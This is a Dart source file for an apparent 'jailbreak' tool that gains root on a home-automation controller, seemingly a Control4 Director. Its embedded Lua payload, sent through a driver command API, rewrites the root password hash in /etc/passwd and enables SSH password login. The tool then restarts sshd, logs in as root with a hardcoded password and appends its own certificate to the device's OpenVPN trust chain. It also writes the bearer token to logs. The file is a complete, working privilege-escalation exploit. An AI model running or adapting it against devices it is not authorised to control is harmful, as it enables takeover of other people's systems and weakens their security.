import 'package:c4_tools/models/certificate_patch.dart' show CertificatePatch;
import 'package:http/http.dart' as http;
import 'package:dartssh2/dartssh2.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'jailbreak_step.dart';
import 'package:path_provider/path_provider.dart';
import 'dart:io';
import 'package:c4_tools/services/app_logger.dart' show appLogger;

class SSHJailbreak {
  final String directorIP;
  final String? jwtToken;
  final Function(int, StepStatus, [String?]) updateStepStatus;
  SSHSocket? _sshSocket;
  SSHClient? _sshClient;
  String? _sshPid;
  Directory? _tempCertDir;

  SSHJailbreak({
    required this.directorIP,
    required this.jwtToken,
    required this.updateStepStatus,
  });

  List<JailbreakStep> createSteps() {
    // TODO: If it's < 4.0.0, we can use the API to reset the password

    final steps = <JailbreakStep>[
      SSHStep(
        title: 'Get Writable Driver',
        subSteps: [
          JailbreakSubStep(
            title: 'Query Drivers',
            description: 'Searching for compatible drivers',
            execute: () async {
              final driverId = await _getWritableDriver();
              if (driverId == null) {
                // TODO: Add a tiny writable driver through the API later
                updateStepStatus(0, StepStatus.failed,
                    "Unable to find a writable driver on the system. If you need to add a driver, open Composer Express and add some common drivers.");
                return false;
              }
              return true;
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ),
      SSHStep(
        title: 'Check System Files',
        subSteps: [
          JailbreakSubStep(
            title: 'Read Account Configuration',
            description: 'Checking current password configuration',
            execute: () async {
              try {
                await _readFile('/etc/passwd');
                return true;
              } catch (e) {
                appLogger.e('Failed to read /etc/passwd:', error: e);
                return false;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Read SSH Configuration',
            description: 'Checking SSH configuration',
            execute: () async {
              try {
                await _readFile('/etc/ssh/sshd_config');
                return true;
              } catch (e) {
                appLogger.e('Failed to read /etc/ssh/sshd_config:', error: e);
                return false;
              }
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ),
      SSHStep(
        title: 'Apply Patch',
        subSteps: [
          JailbreakSubStep(
            title: 'Sending Patch Commands',
            description: 'Executing Lua commands to modify system files',
            execute: () async {
              try {
                final driverId = await _getWritableDriver();
                if (driverId == null) return false;
                await _applyExploit(driverId);
                return true;
              } catch (e) {
                appLogger.e('Failed to apply jailbreak:', error: e);
                return false;
              }
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ),
      SSHStep(
        title: 'Verify Changes',
        subSteps: [
          JailbreakSubStep(
            title: 'Check SSH Config',
            description: 'Verifying SSH configuration changes',
            execute: () async {
              try {
                final sshConfig = await _readFile('/etc/ssh/sshd_config');
                appLogger.t(sshConfig);
                return sshConfig.contains('PasswordAuthentication yes');
              } catch (e) {
                appLogger.e('Failed to verify SSH config:', error: e);
                return false;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Check Password Config',
            description: 'Verifying password configuration changes',
            execute: () async {
              try {
                final passwdConfig = await _readFile('/etc/passwd');
                return passwdConfig.contains(
                    r'root:$6$f4eEEch5avxQp5oR$fKTFi7..SZlVXd7I0zAtf4vP9jla.AwzMnqAIFybJWGQwglOh6JnUMQMvtgMpQPKqWcFouaLI4A5WwzTc7yTm0');
              } catch (e) {
                appLogger.e('Failed to verify password config:', error: e);
                return false;
              }
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ),
      SSHStep(
        title: 'Restart SSH Service',
        subSteps: [
          JailbreakSubStep(
            title: 'Find SSH Process',
            description: 'Locating SSH daemon process',
            execute: () async {
              try {
                final psUrl =
                    'https://${directorIP}:443/api/v1/sysman/ssh?command=ps%20w';
                final client = http.Client();

                final psResponse = await client.get(
                  Uri.parse(psUrl),
                  headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ${jwtToken}',
                  },
                );

                if (psResponse.statusCode != 200) {
                  throw Exception(
                      'Failed to get SSH PID: ${psResponse.statusCode}');
                }

                final psOutput = psResponse.body;
                final pidMatch =
                    RegExp(r'(\d+)\s+root\s+\d+\s+S\s+sshd:.*/usr/sbin/sshd \[listener\]')
                            .firstMatch(psOutput) ??
                        RegExp(r'(\d+)\s+root\s+\d+\s+S\s+/usr/sbin/sshd')
                            .firstMatch(psOutput);
                if (pidMatch == null) {
                  throw Exception('Could not find SSH PID');
                }

                _sshPid = pidMatch.group(1);
                return true;
              } catch (e) {
                appLogger.e('Failed to find SSH process:', error: e);
                throw e;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Send Hang-Up',
            description: 'Sending Hang-Up signal to restart SSH',
            execute: () async {
              try {
                if (_sshPid == null) {
                  throw Exception('SSH PID not found');
                }

                appLogger.t(_sshPid);

                final killUrl =
                    'https://${directorIP}:443/api/v1/sysman/ssh?command=kill%20-HUP%20$_sshPid';
                final client = http.Client();

                appLogger.t(killUrl);

                final killResponse = await client.get(
                  Uri.parse(killUrl),
                  headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ${jwtToken}',
                  },
                );

                if (killResponse.statusCode != 200) {
                  throw Exception(
                      'Failed to restart SSH: ${killResponse.statusCode}');
                }

                return true;
              } catch (e) {
                appLogger.e('Failed to send HUP signal:', error: e);
                throw e;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Verify Restart',
            description: 'Checking if SSH service restarted successfully',
            execute: () async {
              try {
                // Wait a moment for the service to restart
                await Future.delayed(const Duration(seconds: 2));

                final psUrl =
                    'https://${directorIP}:443/api/v1/sysman/ssh?command=ps%20w';
                final client = http.Client();

                final psResponse = await client.get(
                  Uri.parse(psUrl),
                  headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ${jwtToken}',
                  },
                );

                if (psResponse.statusCode != 200) {
                  throw Exception(
                      'Failed to verify SSH restart: ${psResponse.statusCode}');
                }

                final psOutput = psResponse.body;
                final pidMatch = RegExp(r'(\d+)\s+.*sshd').firstMatch(psOutput);
                if (pidMatch == null) {
                  throw Exception('SSH service did not restart properly');
                }

                return true;
              } catch (e) {
                appLogger.e('Failed to verify SSH restart:', error: e);
                throw e;
              }
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ),
      SSHStep(
        title: 'Verify SSH Access',
        subSteps: [
          JailbreakSubStep(
            title: 'Test Connection',
            description: 'Attempting SSH connection',
            execute: () async {
              try {
                await _ensureSSHConnection();
                appLogger.i('Using existing SSH connection for verification');

                final session = await _sshClient!.shell(
                  pty: SSHPtyConfig(
                    width: 80,
                    height: 24,
                  ),
                );

                Completer<bool> resultCompleter = Completer<bool>();
                String result = '';

                final stdoutSubscription = session.stdout.listen(
                  (data) {
                    result += String.fromCharCodes(data);
                    if (result.contains('root')) {
                      resultCompleter.complete(true);
                    }
                  },
                  onError: (error) {
                    appLogger.e('Error in stdout stream:', error: error);
                    resultCompleter.complete(false);
                  },
                );

                session.write(Uint8List.fromList('whoami\n'.codeUnits));

                final success = await resultCompleter.future.timeout(
                  const Duration(seconds: 5),
                  onTimeout: () {
                    appLogger.w('SSH verification timed out');
                    return false;
                  },
                );

                stdoutSubscription.cancel();
                session.close();

                if (success) {
                  appLogger.i('Successfully verified SSH access');
                } else {
                  appLogger.w('Failed to verify SSH access');
                }

                return success;
              } catch (e) {
                appLogger.e('SSH verification failed:', error: e);
                return false;
              }
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ),
    ];

    // Only add certificate patching step on Windows
    if (Platform.isWindows) {
      steps.add(DirectorStep(
        title: 'Patch Director Certificate',
        subSteps: [
          JailbreakSubStep(
            title: 'Download Certificate',
            description: 'Downloading existing certificate from Director',
            execute: () async {
              try {
                appLogger.i('\n=== Downloading Director Certificate ===');
                await _downloadDirectorCertificate();
                appLogger.i('Download Certificate completed successfully');
                return true;
              } catch (e) {
                appLogger.e('Failed to download certificate:', error: e);
                return false;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Create Backup',
            description: 'Creating backup of existing certificate',
            execute: () async {
              try {
                appLogger.i('\n=== Creating Certificate Backup ===');
                await _createCertificateBackup();
                appLogger.i('Create Backup completed successfully');
                return true;
              } catch (e) {
                appLogger.e('Failed to create backup:', error: e);
                return false;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Append Certificate',
            description:
                'Appending our certificate to the Director\'s certificate',
            execute: () async {
              try {
                appLogger.i('\n=== Appending Certificate ===');
                await _ensureSSHConnection();

                final appSupportDir = await getApplicationSupportDirectory();
                final localCertDir = Directory('${appSupportDir.path}/Certs');

                final publicCertPath =
                    '${localCertDir.path}/${CertificatePatch.ComposerCertName}';
                final publicCert =
                    (await File(publicCertPath).readAsString()).trim();
                appLogger.t('Read local certificate from: $publicCertPath\n');

                appLogger.t('Reading remote certificate with SSH...');
                final readSession = await _sshClient!
                    .execute('cat /etc/openvpn/clientca-prod.pem');
                final bytesBuilder = BytesBuilder();
                await for (final data in readSession.stdout) {
                  bytesBuilder.add(data);
                }

                final errorBytes = BytesBuilder();
                await for (final data in readSession.stderr) {
                  errorBytes.add(data);
                }
                final errorResult = utf8.decode(errorBytes.takeBytes());
                if (errorResult.isNotEmpty) {
                  appLogger.e('Error reading certificate: $errorResult');
                }

                await readSession.done;
                final bytes = bytesBuilder.takeBytes();
                final directorCert = String.fromCharCodes(bytes).trim();
                appLogger.t('\nDirector Certificate Contents:');
                appLogger.t('------------------------');
                appLogger.t(directorCert);
                appLogger.t('------------------------\n');

                final uniqueRemoteCertChain =
                    await _consolidateX509CertChain(directorCert);

                // Check if our certificate is already in the chain and if unique
                if (directorCert == uniqueRemoteCertChain &&
                    directorCert.contains(publicCert)) {
                  appLogger.i(
                      'Certificate already patched and no duplicates found\n');
                  return true;
                }

                final timestamp =
                    DateTime.now().toString().replaceAll(':', '-');
                final backupFilename = 'clientca-prod.$timestamp.backup';

                appLogger.t('Creating remote backup...');
                final remoteBackupPath = '/etc/openvpn/$backupFilename';
                final backupSession = await _sshClient!.execute(
                    'cp /etc/openvpn/clientca-prod.pem $remoteBackupPath');
                await backupSession.done;
                appLogger.t('Created remote backup at: $remoteBackupPath\n');

                appLogger.t('Creating local backup...');
                final localBackupPath = '${localCertDir.path}/$backupFilename';
                await File(localBackupPath).writeAsString(directorCert);
                appLogger.t('Created local backup at: $localBackupPath\n');

                // Combine and check for unique certificates
                final combinedCert = '$uniqueRemoteCertChain\n$publicCert';
                final cleanedCertChain =
                    await _consolidateX509CertChain(combinedCert);

                // Make sure we never write an empty certificate chain
                if (cleanedCertChain.trim().isEmpty) {
                  appLogger.e(
                      'ERROR: Certificate cleaning produced an empty result!');
                  appLogger.e(
                      'Skipping certificate cleaning to avoid an empty chain.');
                  return false;
                }

                appLogger.t('Updating remote certificate...');
                final writeSession = await _sshClient!
                    .execute('cat > /etc/openvpn/clientca-prod.pem');
                writeSession.stdin.add(utf8.encode(cleanedCertChain));
                await writeSession.stdin.close(); // Send EOF
                await writeSession.done;
                appLogger.i('Certificate updated successfully\n');

                return true;
              } catch (e) {
                appLogger.e('Failed to append certificate:', error: e);
                return false;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Verify Changes',
            description: 'Verifying certificate changes',
            execute: () async {
              try {
                appLogger.i('\n=== Verifying Certificate ===');
                await _ensureSSHConnection();

                final appSupportDir = await getApplicationSupportDirectory();
                final localCertDir = Directory('${appSupportDir.path}/Certs');
                final publicCertPath =
                    '${localCertDir.path}/${CertificatePatch.ComposerCertName}';
                final publicCert = await File(publicCertPath).readAsString();
                appLogger.t('\nLocal Certificate Contents:');
                appLogger.t('------------------------');
                appLogger.t(publicCert);
                appLogger.t('------------------------\n');

                appLogger.t('Reading remote certificate with SSH...');
                final readSession = await _sshClient!
                    .execute('cat /etc/openvpn/clientca-prod.pem');
                final bytesBuilder = BytesBuilder();
                await for (final data in readSession.stdout) {
                  bytesBuilder.add(data);
                }

                final errorBytes = BytesBuilder();
                await for (final data in readSession.stderr) {
                  errorBytes.add(data);
                }
                final errorResult = utf8.decode(errorBytes.takeBytes());
                if (errorResult.isNotEmpty) {
                  appLogger.e('Error reading certificate: $errorResult');
                }

                await readSession.done;
                final bytes = bytesBuilder.takeBytes();
                final directorCert = String.fromCharCodes(bytes);
                appLogger.t('\nDirector Certificate Contents:');
                appLogger.t('------------------------');
                appLogger.t(directorCert);
                appLogger.t('------------------------\n');

                // Verify our certificate is in the Director's certificate
                final normalizedPublicCert = publicCert
                    .replaceAll('\r\n', '\n')
                    .replaceAll('\r', '\n')
                    .trim();
                final normalizedDirectorCert = directorCert
                    .replaceAll('\r\n', '\n')
                    .replaceAll('\r', '\n')
                    .trim();

                final isVerified =
                    normalizedDirectorCert.contains(normalizedPublicCert);
                if (isVerified) {
                  appLogger.i('Certificate verification successful');
                } else {
                  appLogger.w(
                      'Certificate verification failed - our certificate not found in Director\'s certificate');
                  appLogger.t('\nChecking for partial matches...');

                  // Try to find partial matches for debugging
                  final localLines = normalizedPublicCert.split('\n');
                  for (var line in localLines) {
                    if (line.trim().isNotEmpty) {
                      if (normalizedDirectorCert.contains(line.trim())) {
                        appLogger.t('Found matching line: $line');
                      } else {
                        appLogger.t('Missing line: $line');
                      }
                    }
                  }
                }
                return isVerified;
              } catch (e) {
                appLogger.e('Failed to verify certificate:', error: e);
                return false;
              }
            },
          ),
          JailbreakSubStep(
            title: 'Cleanup',
            description: 'Cleaning up temporary files',
            execute: () async {
              try {
                appLogger.i('\n=== Cleaning Up ===');
                await _cleanUp();
                appLogger.i('Cleanup completed successfully');
                return true;
              } catch (e) {
                appLogger.e('Failed to cleanup:', error: e);
                return false;
              }
            },
          ),
        ],
        updateStepStatus: updateStepStatus,
      ));
    }

    appLogger.t('Step Titles: ${steps.map((step) => step.title).join(', ')}');

    return steps;
  }

  Future<String?> _getWritableDriver() async {
    final url = 'https://${directorIP}:443/api/v1/items';
    final client = http.Client();

    final response = await client.get(
      Uri.parse(url),
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ${jwtToken}',
      },
    );

    if (response.statusCode != 200) {
      appLogger.e(
          'Failed to get items: Error ${response.statusCode} - ${response.body}');
      return null;
    }

    appLogger.t('Response: ${response.body}');

    final items = jsonDecode(response.body) as List;
    for (final item in items) {
      if (item['name'] == 'Data Analytics Agent' ||
          item['name'] == 'Stations') {
        return item['id'].toString();
      }
    }
    return null;
  }

  Future<String> _readFile(String path) async {
    final url =
        'https://${directorIP}:443/api/v1/sysman/ssh?command=cat%20$path';
    final client = http.Client();

    appLogger.t(url);

    final response = await client.get(
      Uri.parse(url),
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ${jwtToken}',
      },
    );

    if (response.statusCode != 200) {
      throw Exception('Failed to read file: ${response.statusCode}');
    }

    return response.body;
  }

  Future<void> _applyExploit(String driverId) async {
    const luaExploit = r'''
    -- Paths
    local ssh_path    = "/etc/ssh/sshd_config"
    local passwd_path = "/etc/passwd"

    -- Desired root password hash
    local new_root_hash = "$6$f4eEEch5avxQp5oR$fKTFi7..SZlVXd7I0zAtf4vP9jla.AwzMnqAIFybJWGQwglOh6JnUMQMvtgMpQPKqWcFouaLI4A5WwzTc7yTm0"

    -- 1) Read & patch sshd_config
    local ssh_lines = {}
    for line in io.lines(ssh_path) do
      if line:match("^%s*PasswordAuthentication%s+no") then
        ssh_lines[#ssh_lines+1] = "PasswordAuthentication yes"
      else
        ssh_lines[#ssh_lines+1] = line
      end
    end

    -- 2) Read & patch /etc/passwd
    local pw_lines = {}
    for line in io.lines(passwd_path) do
      if line:match("^root:") then
        -- split on ':' and replace the 2nd field
        local parts = {}
        for field in line:gmatch("([^:]+)") do
          parts[#parts+1] = field
        end
        parts[2] = new_root_hash
        pw_lines[#pw_lines+1] = table.concat(parts, ":")
      else
        pw_lines[#pw_lines+1] = line
      end
    end

    -- 3) Write back sshd_config
    local f = assert(io.open(ssh_path, "w"))
    for _, l in ipairs(ssh_lines) do
      f:write(l, "\n")
    end
    f:close()

    -- 4) Write back /etc/passwd
    local f2 = assert(io.open(passwd_path, "w"))
    for _, l in ipairs(pw_lines) do
      f2:write(l, "\n")
    end
    f2:close()
    ''';

    final url = 'https://${directorIP}:443/api/v1/items/$driverId/commands';
    final client = http.Client();

    final body = {
      'command': 'LUA_COMMANDS',
      'async': false,
      'tParams': {
        'COMMANDS': luaExploit,
      },
    };

    final response = await client.post(
      Uri.parse(url),
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ${jwtToken}',
      },
      body: jsonEncode(body),
    );

    appLogger.t('POST ${url}');
    appLogger.t('Headers: ${jsonEncode({
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ${jwtToken}',
        })}');
    appLogger.t('Body: ${jsonEncode(body)}');
    appLogger.t('JWT: ${jwtToken}');

    appLogger.t('Response: ${response.body}');

    if (response.statusCode != 200) {
      throw Exception('Failed to apply jailbreak: ${response.statusCode}');
    }
  }

  Future<void> _ensureSSHConnection() async {
    try {
      // If we have an existing connection, try to verify it's still alive
      if (_sshSocket != null && _sshClient != null) {
        try {
          final session = await _sshClient!.shell(
            pty: SSHPtyConfig(
              width: 80,
              height: 24,
            ),
          );
          session.close();
          return; // Connection is still good
        } catch (e) {
          appLogger.w('Existing SSH connection failed, reconnecting...');
          await _closeSSHConnection();
        }
      }

      int retries = 3;
      while (retries > 0) {
        try {
          _sshSocket = await SSHSocket.connect(directorIP, 22);
          _sshClient = SSHClient(
            _sshSocket!,
            username: 'root',
            onPasswordRequest: () => 't0talc0ntr0l4!',
          );

          final session = await _sshClient!.shell(
            pty: SSHPtyConfig(
              width: 80,
              height: 24,
            ),
          );
          session.close();
          appLogger.i('SSH connection established successfully');
          return;
        } catch (e) {
          appLogger.e('SSH connection attempt failed:', error: e);
          await _closeSSHConnection();
          retries--;
          if (retries > 0) {
            appLogger
                .t('Retrying SSH connection... ($retries attempts remaining)');
            await Future.delayed(const Duration(seconds: 2));
          }
        }
      }

      throw Exception(
          'Failed to establish SSH connection after multiple attempts');
    } catch (e) {
      appLogger.e('Error in _ensureSSHConnection:', error: e);
      await _closeSSHConnection();
      rethrow;
    }
  }

  Future<void> _closeSSHConnection() async {
    try {
      if (_sshClient != null) {
        _sshClient!.close();
      }
      if (_sshSocket != null) {
        _sshSocket!.close();
      }
    } catch (e) {
      appLogger.e('Error closing SSH connection:', error: e);
    } finally {
      _sshClient = null;
      _sshSocket = null;
    }
  }

  Future<void> _downloadDirectorCertificate() async {
    try {
      appLogger.i('\n=== Downloading Director Certificate ===');
      await _ensureSSHConnection();

      if (_tempCertDir == null) {
        _tempCertDir = await Directory.systemTemp.createTemp('c4_certs');
      }
      final localCertPath = '${_tempCertDir!.path}/clientca-prod.pem';

      // Download the certificate using SSH
      // SCP isn't supported with this version of SSH and
      // SFTP is not supported on OS3 apparently

      final session =
          await _sshClient!.execute('cat /etc/openvpn/clientca-prod.pem');
      final bytesBuilder = BytesBuilder();
      await for (final data in session.stdout) {
        bytesBuilder.add(data);
      }
      final bytes = bytesBuilder.takeBytes();
      await session.done;

      await File(localCertPath).writeAsBytes(bytes);
      appLogger.t('Downloaded certificate to: $localCertPath');
      appLogger.t('Got ${bytes.length} bytes\n');

      final timestamp = DateTime.now().toString().replaceAll(':', '-');
      final localBackupPath =
          '${_tempCertDir!.path}/clientca-prod.$timestamp.backup';
      await File(localBackupPath).writeAsBytes(bytes);
      appLogger.t('Created local backup at: $localBackupPath\n');
    } catch (e) {
      appLogger.e('Failed to download certificate:', error: e);
      rethrow;
    }
  }

  Future<void> _createCertificateBackup() async {
    try {
      appLogger.i('\n=== Creating Certificate Backup ===');
      await _ensureSSHConnection();

      final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final backupPath = '/etc/openvpn/clientca-prod.${timestamp}.backup';
      appLogger.t('Backup path: $backupPath');

      // Use single quotes around the path to prevent shell expansion issues
      appLogger.t('Executing backup command...');
      final session = await _sshClient!.execute(
          "cp /etc/openvpn/clientca-prod.pem '${backupPath}' && echo 'Success'");

      final outputBytes = BytesBuilder();
      await for (final data in session.stdout) {
        outputBytes.add(data);
        appLogger.t('data: ${String.fromCharCodes(data)}');
      }
      await for (final data in session.stderr) {
        appLogger.t('error: ${String.fromCharCodes(data)}');
      }
      final result = utf8.decode(outputBytes.takeBytes());

      appLogger.t('Backup result: $result');

      await session.done;

      if (!result.contains('Success')) {
        throw Exception('Failed to create backup on remote system');
      }

      appLogger.t('Created backup at: $backupPath\n');
    } catch (e) {
      appLogger.e('Failed to create backup:', error: e);
      rethrow;
    }
  }

  Future<void> _cleanUp() async {
    try {
      if (_tempCertDir != null) {
        await _tempCertDir!.delete(recursive: true);
        _tempCertDir = null;
      }
    } catch (e) {
      appLogger.e('Error cleaning up temporary directory:', error: e);
    }
  }

  Future<String> _consolidateX509CertChain(String certChain) async {
    try {
      appLogger.t('Consolidating certificate chain...');

      final certs = certChain
          .split('-----END CERTIFICATE-----')
          .where((cert) => cert.trim().isNotEmpty)
          .map((cert) => '${cert.trim()}\n-----END CERTIFICATE-----')
          .toList();

      appLogger.t('Found ${certs.length} certificates in chain');

      final Map<String, String> subjectToCertMap = {};

      for (var i = certs.length - 1; i >= 0; i--) {
        final cert = certs[i];
        final remoteCertPath = '/tmp/cert_$i.pem';

        final writeSession = await _sshClient!.execute('cat > $remoteCertPath');
        writeSession.stdin.add(utf8.encode(cert));
        await writeSession.stdin.close();
        await writeSession.done;

        final subjectSession = await _sshClient!.execute(
            'openssl x509 -in $remoteCertPath -noout -subject 2>/dev/null || echo "INVALID_CERT"');

        final stdoutBytes = BytesBuilder();
        await for (final data in subjectSession.stdout) {
          stdoutBytes.add(data);
        }

        final subject = utf8.decode(stdoutBytes.takeBytes()).trim();
        await subjectSession.done;

        if (subject == 'INVALID_CERT' || subject.isEmpty) {
          appLogger.w('Warning: Certificate $i appears invalid, skipping');
          continue;
        }

        appLogger.t('Certificate $i subject: $subject');

        if (!subjectToCertMap.containsKey(subject)) {
          subjectToCertMap[subject] = cert;
        }
      }

      await _sshClient!.execute('rm -f /tmp/cert_*.pem');

      if (subjectToCertMap.isEmpty) {
        appLogger.w(
            'No valid certificates with subjects found! Using original chain.');
        return certChain;
      }

      appLogger.t(
          'Consolidated chain contains ${subjectToCertMap.length} unique certificates');

      return subjectToCertMap.values.join('\n\n').trim();
    } catch (e) {
      appLogger.e('Error consolidating certificate chain:', error: e);
      return certChain;
    }
  }
}
